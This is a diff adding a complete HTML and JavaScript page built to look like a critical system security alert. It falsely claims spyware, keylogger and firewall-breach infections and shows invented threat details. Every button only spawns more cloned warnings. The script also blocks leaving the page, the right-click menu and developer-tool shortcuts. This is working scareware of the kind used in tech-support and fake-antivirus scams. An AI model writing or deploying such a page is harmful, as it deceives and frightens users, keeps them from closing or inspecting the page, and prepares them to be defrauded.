@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Alert</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        
+        .warning-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            z-index: 100;
+        }
+        
+        .warning-header {
+            background-color: #cc0000;
+            color: white;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+        }
+        
+        .warning-header h2 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .warning-header .icon {
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        
+        .warning-content {
+            padding: 20px;
+            background-color: #fff;
+        }
+        
+        .warning-message {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        
+        .warning-icon {
+            color: #cc0000;
+            font-size: 48px;
+            margin-right: 15px;
+        }
+        
+        .warning-text h3 {
+            color: #cc0000;
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .warning-text p {
+            margin: 5px 0;
+            line-height: 1.4;
+            font-size: 14px;
+        }
+        
+        .threat-details {
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .threat-details p {
+            margin: 5px 0;
+            font-size: 13px;
+        }
+        
+        .threat-details strong {
+            color: #333;
+        }
+        
+        .warning-buttons {
+            display: flex;
+            justify-content: flex-end;
+            padding: 15px 20px;
+            background-color: #f0f0f0;
+            border-bottom-left-radius: 5px;
+            border-bottom-right-radius: 5px;
+        }
+        
+        .warning-button {
+            padding: 8px 16px;
+            margin-left: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .remove-button {
+            background-color: #4285f4;
+            color: white;
+        }
+        
+        .ignore-button {
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            color: #333;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 50;
+        }
+        
+        .blink {
+            animation: blink-animation 1s steps(5, start) infinite;
+        }
+        
+        @keyframes blink-animation {
+            to {
+                visibility: hidden;
+            }
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #f0f0f0;
+            height: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #cc0000;
+            border-radius: 5px;
+            width: 0;
+        }
+        
+        .scan-text {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .scanner-container {
+            margin-top: 15px;
+        }
+        
+        .additional-popup {
+            position: fixed;
+            width: 350px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+            z-index: 101;
+            padding: 15px;
+            animation: popup-animation 0.5s ease-out;
+        }
+        
+        @keyframes popup-animation {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        #popup1 {
+            top: 30px;
+            right: 30px;
+        }
+        
+        #popup2 {
+            bottom: 30px;
+            left: 30px;
+        }
+        
+        .popup-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .popup-header i {
+            color: #cc0000;
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .popup-header h3 {
+            margin: 0;
+            font-size: 14px;
+            color: #cc0000;
+        }
+        
+        .popup-content p {
+            margin: 5px 0;
+            font-size: 12px;
+            line-height: 1.3;
+        }
+        
+        .popup-button {
+            padding: 6px 12px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    
+    <div class="warning-container" id="mainWarning">
+        <div class="warning-header">
+            <span class="icon">⚠️</span>
+            <h2>CRITICAL SECURITY ALERT</h2>
+        </div>
+        <div class="warning-content">
+            <div class="warning-message">
+                <div class="warning-icon">⚠️</div>
+                <div class="warning-text">
+                    <h3>WARNING: Your computer has been infected with spyware!</h3>
+                    <p>Our security scan has detected malicious software on your device that may be stealing your personal information.</p>
+                    <p>This malware can track your keystrokes, access your camera, and transmit your personal data to remote servers.</p>
+                </div>
+            </div>
+            
+            <div class="threat-details">
+                <p><strong>Threat detected:</strong> TROJAN-SPYWARE.Win32.KeyLogger</p>
+                <p><strong>Risk level:</strong> High</p>
+                <p><strong>Infected files:</strong> 13</p>
+                <p><strong>Personal data at risk:</strong> Passwords, Credit Card Information, Browsing History</p>
+            </div>
+            
+            <div class="scanner-container">
+                <div class="scan-text">System scan in progress...</div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+            </div>
+        </div>
+        <div class="warning-buttons">
+            <button class="warning-button ignore-button" id="ignoreButton">Ignore (Not Recommended)</button>
+            <button class="warning-button remove-button" id="removeButton">Remove Threats Now</button>
+        </div>
+    </div>
+    
+    <div class="additional-popup hidden" id="popup1">
+        <div class="popup-header">
+            <i>🔒</i>
+            <h3>Firewall Breach Detected</h3>
+        </div>
+        <div class="popup-content">
+            <p>Your system's firewall has been compromised. Unknown connection attempts detected from multiple IP addresses.</p>
+            <p>Immediate action required to secure your network.</p>
+            <button class="popup-button">Secure Now</button>
+        </div>
+    </div>
+    
+    <div class="additional-popup hidden" id="popup2">
+        <div class="popup-header">
+            <i>🔒</i>
+            <h3>Data Encryption Risk</h3>
+        </div>
+        <div class="popup-content">
+            <p>Your personal files may be vulnerable to ransomware encryption. Backup system inactive.</p>
+            <p>Enable protection immediately to prevent data loss.</p>
+            <button class="popup-button">Protect Files</button>
+        </div>
+    </div>
+    
+    <script>
+        // Variables to track popup state
+        let currentPopup = 1;
+        let progressValue = 0;
+        let progressIncreasing = true;
+        let popupCount = 0;
+        let maxPopups = 5;
+        
+        // Make progressBar animate
+        function updateProgressBar() {
+            const progressBar = document.getElementById('progressBar');
+            
+            if (progressIncreasing) {
+                progressValue += 1;
+                if (progressValue >= 95) {
+                    progressIncreasing = false;
+                }
+            } else {
+                progressValue -= 0.5;
+                if (progressValue <= 60) {
+                    progressIncreasing = true;
+                }
+            }
+            
+            progressBar.style.width = progressValue + '%';
+            setTimeout(updateProgressBar, 100);
+        }
+        
+        // Start the progress bar animation
+        updateProgressBar();
+        
+        // Function to create a random popup
+        function createRandomPopup() {
+            // Only create a limited number of popups
+            if (popupCount >= maxPopups) return;
+            
+            // Get random position
+            const left = Math.floor(Math.random() * (window.innerWidth - 350));
+            const top = Math.floor(Math.random() * (window.innerHeight - 200));
+            
+            // Create popup
+            const popup = document.createElement('div');
+            popup.className = 'additional-popup';
+            popup.style.left = left + 'px';
+            popup.style.top = top + 'px';
+            
+            // Randomly choose content
+            const isVirus = Math.random() > 0.5;
+            
+            if (isVirus) {
+                popup.innerHTML = `
+                    <div class="popup-header">
+                        <i>⚠️</i>
+                        <h3>Virus Activity Detected</h3>
+                    </div>
+                    <div class="popup-content">
+                        <p>Suspicious process attempting to access system files. Your data may be at risk.</p>
+                        <p>Immediate action required.</p>
+                        <button class="popup-button">Scan & Remove</button>
+                    </div>
+                `;
+            } else {
+                popup.innerHTML = `
+                    <div class="popup-header">
+                        <i>🔒</i>
+                        <h3>Security Breach Alert</h3>
+                    </div>
+                    <div class="popup-content">
+                        <p>Unauthorized access attempt detected from IP: ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}</p>
+                        <p>Strengthen your security now.</p>
+                        <button class="popup-button">Block Access</button>
+                    </div>
+                `;
+            }
+            
+            document.body.appendChild(popup);
+            popupCount++;
+            
+            // Add event listeners to the buttons
+            const buttons = popup.querySelectorAll('button');
+            buttons.forEach(button => {
+                button.addEventListener('click', function() {
+                    createClone();
+                });
+            });
+        }
+        
+        // Function to toggle between popup1 and popup2
+        function togglePopups() {
+            if (currentPopup === 1) {
+                document.getElementById('popup1').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('popup1').classList.add('hidden');
+                    currentPopup = 2;
+                }, 3000);
+            } else {
+                document.getElementById('popup2').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('popup2').classList.add('hidden');
+                    currentPopup = 1;
+                }, 3000);
+            }
+            
+            // Schedule next popup toggle
+            setTimeout(togglePopups, 4000);
+        }
+        
+        // Function to create a clone of the main warning
+        function createClone() {
+            const clone = document.getElementById('mainWarning').cloneNode(true);
+            
+            // Position randomly
+            const left = Math.floor(Math.random() * (window.innerWidth - 600));
+            const top = Math.floor(Math.random() * (window.innerHeight - 400));
+            
+            clone.style.left = left + 'px';
+            clone.style.top = top + 'px';
+            clone.style.transform = 'none';
+            
+            document.body.appendChild(clone);
+            
+            // Add event listeners to the clone buttons
+            const buttons = clone.querySelectorAll('button');
+            buttons.forEach(button => {
+                button.addEventListener('click', function() {
+                    createClone();
+                });
+            });
+        }
+        
+        // Start showing popups after a delay
+        setTimeout(() => {
+            // Start toggling between popup1 and popup2
+            togglePopups();
+            
+            // Create random popups occasionally
+            setInterval(createRandomPopup, 5000);
+        }, 2000);
+        
+        // Add event listeners to buttons
+        document.getElementById('removeButton').addEventListener('click', function() {
+            createClone();
+        });
+        
+        document.getElementById('ignoreButton').addEventListener('click', function() {
+            createClone();
+        });
+        
+        // Function to make the warning flash/blink occasionally
+        function startBlinking() {
+            const warningHeader = document.querySelector('.warning-header');
+            warningHeader.classList.add('blink');
+            
+            setTimeout(() => {
+                warningHeader.classList.remove('blink');
+                
+                // Schedule next blink
+                setTimeout(startBlinking, Math.random() * 5000 + 3000);
+            }, 2000);
+        }
+        
+        // Start blinking effect
+        setTimeout(startBlinking, 3000);
+        
+        // Block attempts to close the window or navigate away
+        window.onbeforeunload = function() {
+            return "WARNING: Your system is still infected! Closing this window will put your data at risk.";
+        };
+        
+        // Make it difficult to use browser tools (for added realism, will only work in some browsers)
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', event => {
+            if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
+                event.preventDefault();
+                createClone();
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
